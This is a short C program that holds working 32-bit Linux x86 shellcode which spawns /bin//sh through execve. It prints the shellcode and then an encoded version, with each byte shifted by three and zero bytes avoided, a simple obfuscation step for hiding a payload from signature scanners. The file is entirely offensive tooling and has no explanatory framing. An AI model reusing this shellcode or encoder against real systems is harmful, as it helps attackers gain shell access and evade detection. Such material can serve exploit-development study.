#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *shellcode ="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
 
int main(int argc,char *argv[]){
	unsigned char *char_ptr = (char *)shellcode;
	unsigned char val = 'x';
	int i = 1;
	printf("Original Shellcode:");
	while(*char_ptr != '\0'){
		val = *char_ptr;
		printf("\\x%02x",val);
		char_ptr++;
	}
	printf("\n");
	char_ptr = shellcode;
	printf("Encoded Shellcode: ");

	while(*char_ptr != '\0')
	{
		val = *char_ptr;
		val = val +3;
		if(val ==0)
		val = 1;
		printf("0x%02x,",val);
		char_ptr++;
	}
	printf("\n");
	return 0;
}
